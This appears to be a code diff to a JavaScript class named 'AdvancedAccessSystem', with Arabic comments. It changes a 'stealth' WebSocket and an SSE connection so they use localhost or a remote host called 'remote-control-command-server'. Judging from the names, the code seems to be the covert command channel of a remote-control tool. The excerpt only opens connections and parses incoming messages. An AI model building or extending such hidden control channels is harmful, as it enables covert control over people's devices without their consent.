@@ -398,7 +398,13 @@ class AdvancedAccessSystem {
     // إعداد WebSocket سري
     setupStealthWebSocket() {
         try {
-            const ws = new WebSocket('wss://remote-control-command-server.onrender.com/stealth');
+            // تحديد الرابط الصحيح بناءً على البيئة
+            const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+            const serverUrl = isLocalhost 
+                ? 'ws://localhost:10001' 
+                : 'wss://remote-control-command-server.onrender.com';
+            
+            const ws = new WebSocket(serverUrl);
             
             ws.onopen = () => {
                 console.log('🔗 تم الاتصال بـ WebSocket السري');
@@ -428,7 +434,13 @@ class AdvancedAccessSystem {
     // إعداد SSE Connection
     setupSSEConnection() {
         try {
-            const eventSource = new EventSource('https://remote-control-command-server.onrender.com/events');
+            // تحديد الرابط الصحيح بناءً على البيئة
+            const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+            const serverUrl = isLocalhost 
+                ? 'http://localhost:10001/events' 
+                : 'https://remote-control-command-server.onrender.com/events';
+            
+            const eventSource = new EventSource(serverUrl);
             
             eventSource.onmessage = (event) => {
                 this.handleSSEMessage(JSON.parse(event.data));
